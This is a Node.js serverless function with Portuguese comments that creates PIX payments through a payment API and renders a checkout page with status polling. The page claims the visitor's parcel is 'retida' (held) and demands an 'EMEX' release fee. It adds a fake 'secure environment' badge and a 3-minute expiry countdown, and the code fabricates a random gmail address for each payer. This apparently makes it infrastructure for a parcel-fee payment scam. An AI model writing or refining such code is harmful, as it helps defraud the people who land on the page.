// /api/index.js
// ÚNICO ARQUIVO: HTML + cria transação PIX + consulta status (BestFyBR)
// Versão "blindada" + contador 3min + expiração com regeneração

module.exports = async function handler(req, res) {
  try {
    const BESTFY_SECRET = process.env.BESTFY_SECRET || "";
    const BESTFY_BASE = "https://api.bestfybr.com.br/v1";

    // Helpers ----------
    const respondJSON = (obj, code = 200) => {
      try {
        res.status(code).json(obj);
      } catch {
        res.status(200).send(JSON.stringify(obj));
      }
    };
    const respondHTML = (html) => {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.status(200).send(html);
    };
    const log = (...args) => {
      try { console.error("[api/index]", ...args); } catch {}
    };

    async function safeFetch(url, options = {}, timeoutMs = 20000) {
      const ctrl = new AbortController();
      const id = setTimeout(() => ctrl.abort(), timeoutMs);
      try {
        const resp = await fetch(url, { ...options, signal: ctrl.signal });
        const text = await resp.text();
        let data;
        try { data = JSON.parse(text); } catch { data = { raw: text }; }
        return { ok: resp.ok, status: resp.status, data };
      } catch (err) {
        return { ok: false, status: 0, data: { error: String(err) } };
      } finally {
        clearTimeout(id);
      }
    }

    function isJsonRequest() {
      const a = String(req.headers["accept"] || "");
      return a.includes("application/json");
    }

    // Rotas ----------
    // 1) Status: /api/index?action=status&id=...
    if (req.query.action === "status") {
      try {
        const id = String(req.query.id || "");
        if (!id) return respondJSON({ ok: false, error: "ID ausente" });

        if (!BESTFY_SECRET) {
          return respondJSON({ ok: false, error: "BESTFY_SECRET não configurada" });
        }

        const auth = "Basic " + Buffer.from(`${BESTFY_SECRET}:x`).toString("base64");
        const r = await safeFetch(`${BESTFY_BASE}/transactions/${encodeURIComponent(id)}`, {
          headers: { Authorization: auth },
        });

        if (!r.ok) {
          log("status-fetch-fail", r.status, r.data);
          return respondJSON({ ok: false, error: "Falha ao consultar status", details: r.data });
        }

        const status = r.data?.status || r.data?.transaction?.status || "UNKNOWN";
        return respondJSON({ ok: true, status, raw: r.data });
      } catch (e) {
        log("status-catch", e);
        return respondJSON({ ok: false, error: String(e) });
      }
    }

    // 2) Geração de PIX + HTML: /api/index?nome=&cpf=&value=
    const nome = (req.query.nome || "").toString().trim();
    const cpf = (req.query.cpf || "").toString().replace(/\D/g, "");
    const value = Number(req.query.value || 0); // em centavos (ex.: 6780)

    if (nome && cpf && value > 0) {
      try {
        if (!BESTFY_SECRET) {
          return renderErrorHTML(
            "Configuração ausente",
            "A variável BESTFY_SECRET não está configurada no Vercel."
          );
        }

        const email =
          `${nome.toLowerCase().replace(/\s+/g, "")}${Math.floor(Math.random() * 9000 + 1000)}@gmail.com`;

        const payload = {
          amount: Math.round(value),
          paymentMethod: "pix",
          customer: {
            name: nome,
            email,
            document: { number: cpf, type: "cpf" },
          },
          items: [
            {
              title: "Taxa EMEX",
              unitPrice: Math.round(value),
              quantity: 1,
              tangible: false,
            },
          ],
          pix: { expiresInDays: 1 },
        };

        const auth = "Basic " + Buffer.from(`${BESTFY_SECRET}:x`).toString("base64");

        const r = await safeFetch(`${BESTFY_BASE}/transactions`, {
          method: "POST",
          headers: {
            Authorization: auth,
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        });

        if (!r.ok || !r.data?.id) {
          log("create-fail", r.status, r.data);
          return renderErrorHTML(
            "Não foi possível gerar o PIX",
            typeof r.data === "object" ? JSON.stringify(r.data) : String(r.data)
          );
        }

        const txId = r.data.id;
        const qrcode = r.data?.pix?.qrcode || "";
        const qrcodeImage =
          r.data?.pix?.qrcode_image ||
          (qrcode
            ? `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(
                qrcode
              )}`
            : "");

        return renderPixHTML({ nome, cpf, value, txId, qrcode, qrcodeImage });
      } catch (e) {
        log("pix-catch", e);
        return renderErrorHTML("Erro inesperado", String(e));
      }
    }

    // 3) Sem parâmetros: “API viva” para teste rápido
    if (isJsonRequest()) {
      return respondJSON({
        ok: true,
        info:
          "Função ativa. Para gerar PIX, chame /api/index?nome=...&cpf=...&value=6780. Para status: /api/index?action=status&id=...",
      });
    }
    return respondHTML(`<!doctype html>
<html lang="pt-BR"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>API viva</title><style>body{font-family:system-ui,Arial;margin:24px}code{background:#f3f4f6;padding:2px 6px;border-radius:4px}</style></head>
<body>
  <h1>API viva ✅</h1>
  <p>Use: <code>/api/index?nome=asdda&amp;cpf=32131231=amp;value=6780</code> para gerar PIX.</p>
  <p>Status: <code>/api/index?action=status&amp;id=TRANSACAO_ID</code></p>
</body></html>`);

    // ---- helpers que precisam do escopo de res ----
    function renderErrorHTML(titulo, detalhe) {
      return respondHTML(`<!doctype html>
<html lang="pt-BR"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Erro</title><style>
body{font-family:system-ui,Arial;background:#f9fafb;margin:0}
.container{max-width:720px;margin:40px auto;background:#fff;border-radius:8px;box-shadow:0 4px 10px rgba(0,0,0,.08);padding:24px}
h1{margin:0 0 8px;font-size:22px}
pre{white-space:pre-wrap;background:#f3f4f6;padding:12px;border-radius:8px;font-size:13px}
a.btn{display:inline-block;margin-top:12px;padding:10px 14px;background:#111827;color:#fff;text-decoration:none;border-radius:8px}
</style></head><body>
  <div class="container">
    <h1>${escapeHtml(titulo)}</h1>
    ${detalhe ? `<pre>${escapeHtml(detalhe)}</pre>` : ``}
    <a class="btn" href="/pagamento/dados.html">Tentar novamente</a>
  </div>
</body></html>`);
    }

    function renderPixHTML({ nome, cpf, value, txId, qrcode, qrcodeImage }) {
      const pixAmount = Number(value / 100).toFixed(2).replace(".", ",");
      // params para regenerar
      const params = { nome, cpf, value };

      return respondHTML(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Pagamento PIX</title>

<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f3f4f6;min-height:100vh}
  .top-bar{background:#fff;border-bottom:1px solid #e5e7eb;padding:12px 0;}
  .top-bar-content{max-width:1200px;margin:0 auto;padding:0 16px;display:flex;justify-content:space-between;align-items:center}
  .logo{height:32px}
  .secure-badge{display:flex;align-items:center;color:#3483fa;font-size:14px;font-weight:500}
  .secure-badge svg{margin-right:8px}

  .container{max-width:28rem;margin:0 auto;padding:16px}
  .card{background:#fff;border-radius:8px;box-shadow:0 4px 6px -1px rgba(0,0,0,.1);padding:24px;margin-top:16px}
  .text-center{text-align:center}
  .title{font-size:24px;font-weight:bold;margin-bottom:16px}

  .info-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin-bottom:24px}
  .info-box p{color:#1e40af;font-size:14px}

  .pix-value{margin-bottom:12px;text-align:center}
  .pix-value p{margin:0}
  .pix-amount{color:#3483fa;font-size:24px;font-weight:bold;margin-top:4px}

  .countdown{color:#6b7280;font-size:14px;text-align:center;margin:8px 0 16px}
  .expired{opacity:.2;filter:grayscale(1)}

  .pix-input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:8px;background:#f9fafb;color:#6b7280;margin:12px 0 8px}
  .copy-button{
    width:100%;padding:12px;border:none;border-radius:8px;
    background:#3483fa;color:#fff; /* texto branco */
    font-weight:600;cursor:pointer;
    display:flex;align-items:center;justify-content:center;transition:background-color .2s}
  .copy-button:hover{background:#111827;color:#fff}
  .copy-button[disabled]{background:#111827;opacity:.9;cursor:pointer;color:#fff}
</style>
</head>

<body>
  <div class="top-bar">
    <div class="top-bar-content">
      <img src="/images/logo.png" alt="Logo" class="logo">
      <div class="secure-badge">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M9 12l2 2 4-4"></path>
          <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <span>Ambiente seguro</span>
      </div>
    </div>
  </div>

  <div class="container">
    <div class="card">
      <div class="text-center">
        <h1 class="title">Tarifa Produto</h1>
      </div>

      <div class="info-box" style="text-align:center;">
        <p>Sua encomenda está Retida</p>
      </div>

      <div class="pix-value">
        <p style="color:#545454;">Valor do PIX: Taxa EMEX + Liberação</p>
        <p class="pix-amount">R$ ${pixAmount}</p>
      </div>

      <div class="countdown">Expira em: <strong id="countdown">03:00</strong></div>

      <div id="qr-container" style="text-align:center; margin:20px 0;">
        <img id="qrImg" src="${qrcodeImage}" alt="QR Code PIX" style="display:block; margin:20px auto;">
        <input type="text" class="pix-input" value="${escapeHtml(qrcode)}" readonly id="pixCopiaCola">
        <button id="copyButton" class="copy-button">Copiar código</button>
      </div>

      <div class="instructions">
        <h2 class="title" style="font-size:20px;margin-bottom:12px">Pagar seu pedido com PIX</h2>
        <div class="instruction-item">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><path d="M12 18h.01"></path>
          </svg>
          <p class="instruction-text">Copie o código acima.</p>
        </div>
        <div class="instruction-item">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path><path d="M9 12l2 2 4-4"></path>
          </svg>
          <p class="instruction-text">Selecione a opção PIX Copia e Cola no aplicativo onde você tem o PIX habilitado.</p>
        </div>
      </div>

      <div class="divider"></div>
      <div class="small" style="text-align:center">Nome: <strong>${escapeHtml(nome)}</strong> • CPF: <strong>${maskCpf(cpf)}</strong></div>
    </div>
  </div>

<script>
  // --- PARAMS para regenerar ---
  const _params = ${JSON.stringify(params)};

  // --- COPIAR código ---
  document.getElementById("copyButton").onclick = async function(){
    try{
      const el = document.getElementById("pixCopiaCola");
      el.select(); el.setSelectionRange(0, 99999);
      await navigator.clipboard.writeText(el.value);
      this.innerText = "Copiado!";
      setTimeout(()=> this.innerText = "Copiar código", 1500);
    }catch(e){}
  };

  // --- POLLING (para aprovações) ---
  (function(){
    const id = ${JSON.stringify(txId)};
    let _expired = false;
    async function check(){
      if (_expired) return;
      try{
        const r = await fetch(${JSON.stringify("/api/index?action=status&id=")} + encodeURIComponent(id));
        const j = await r.json();
        if(j && j.status === "APPROVED"){
          window.location.href = "/obrigado";
          return;
        }
      }catch(e){}
      setTimeout(check, 3000);
    }
    check();

    // --- TIMER 3min ---
    var total = 3 * 60; // 180s
    var countdownEl = document.getElementById("countdown");
    var qrImg = document.getElementById("qrImg");
    var input = document.getElementById("pixCopiaCola");
    var btn = document.getElementById("copyButton");

    function fmt(s){
      var m = Math.floor(s/60).toString().padStart(2,"0");
      var r = (s%60).toString().padStart(2,"0");
      return m + ":" + r;
    }
    function tick(){
      countdownEl.textContent = fmt(total);
      if (total <= 0){
        _expired = true;
        // visual de expirado
        if (qrImg) qrImg.classList.add("expired");
        if (input) {
          input.value = "Código Pix Expirado";
          input.readOnly = true;
        }
        if (btn) {
          btn.textContent = "Gerar novamente";
          btn.disabled = false; // usaremos como CTA de regenerar
          btn.onclick = function(){
            const u = new URL(window.location.href);
            u.search = new URLSearchParams(_params).toString(); // mesma rota, novo PIX
            window.location.href = u.toString();
          };
        }
        return;
      }
      total--;
      setTimeout(tick, 1000);
    }
    tick();
  })();
</script>
</body>
</html>`);
    }
  } catch (fatal) {
    try {
      res.status(200).json({ ok: false, fatal: String(fatal) });
    } catch {
      res.status(200).send(`{"ok":false,"fatal":${JSON.stringify(String(fatal))}}`);
    }
  }
};

/* ---------- helpers puros ---------- */
function escapeHtml(s) {
  return String(s)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}
function maskCpf(cpf) {
  const v = String(cpf).replace(/\D/g, "");
  return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}
